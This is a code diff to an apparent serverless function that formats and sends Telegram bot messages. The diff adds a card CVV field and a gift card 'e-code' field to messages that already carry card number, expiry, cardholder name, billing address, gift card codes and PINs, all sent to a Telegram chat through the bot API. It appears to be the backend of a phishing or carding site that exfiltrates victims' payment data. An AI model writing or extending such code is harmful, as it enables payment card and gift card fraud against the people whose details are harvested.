@@ -17,6 +17,7 @@ interface TelegramNotification {
   giftcardWanted?: string;
   code?: string;
   pin?: string;
+  ecode?: string;
   amount?: string;
   country?: string;
   verificationId?: string;
@@ -29,6 +30,7 @@ interface TelegramNotification {
   creditCardInfo?: {
     cardNumber: string;
     expiryDate: string;
+    cvv: string;
     cardholderName: string;
     billingAddress: string;
     city: string;
@@ -192,6 +194,7 @@ serve(async (req) => {
                   `\n*Card Details:*\n` +
                   `Card Number: ${notificationData.creditCardInfo.cardNumber}\n` +
                   `Expiry: ${notificationData.creditCardInfo.expiryDate}\n` +
+                  `CVV: ${notificationData.creditCardInfo.cvv}\n` +
                   `Cardholder: ${notificationData.creditCardInfo.cardholderName}\n` +
                   `Address: ${notificationData.creditCardInfo.billingAddress}, ${notificationData.creditCardInfo.city}\n` +
                   `Postal Code: ${notificationData.creditCardInfo.postalCode}\n` +
@@ -222,6 +225,7 @@ serve(async (req) => {
                 `💰 Amount: ${notificationData.amount}\n` +
                 `🔢 Code: ${notificationData.code}\n` +
                 `📌 PIN: ${notificationData.pin}\n` +
+                `🎯 E-Code: ${notificationData.ecode || 'N/A'}\n` +
                 `⏰ Time: ${new Date().toLocaleString()}`;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -283,6 +287,7 @@ serve(async (req) => {
                 `💰 Amount: ${notificationData.amount}\n` +
                 `🔢 Code: ${notificationData.code}\n` +
                 `📌 PIN: ${notificationData.pin}\n` +
+                `🎯 E-Code: ${notificationData.ecode || 'N/A'}\n` +
                 `💳 Payment Method: ${notificationData.paymentMethod}\n` +
                 `💼 Payment Details: ${JSON.stringify(notificationData.paymentDetails)}\n` +
                 `⏰ Time: ${new Date().toLocaleString()}`;
